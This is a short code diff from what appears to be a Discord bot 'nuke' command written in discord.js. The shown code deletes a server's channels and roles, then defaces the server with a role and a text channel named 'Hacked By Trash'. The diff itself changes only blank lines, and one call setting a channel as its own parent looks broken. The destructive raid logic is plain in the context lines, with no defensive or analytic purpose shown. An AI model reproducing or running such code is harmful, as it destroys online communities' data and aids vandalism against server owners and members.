@@ -9,6 +9,7 @@ module.exports.run = async (bot, message, args) => {
        message.guild.roles.forEach(function(rol) {
                  kan.delete()
                  rol.delete()
+         
           message.guild.createRole({
         name: `👑 | HACKED BY TRASH`,
         color: "#080000", 
@@ -18,7 +19,6 @@ module.exports.run = async (bot, message, args) => {
     ]
       
     })
-    
                      
          message.guild.createChannel(`Hacked By T R A S H`, "text").then(HACKEDBYTRASH => {
          HACKEDBYTRASH.setParent(HACKEDBYTRASH)  
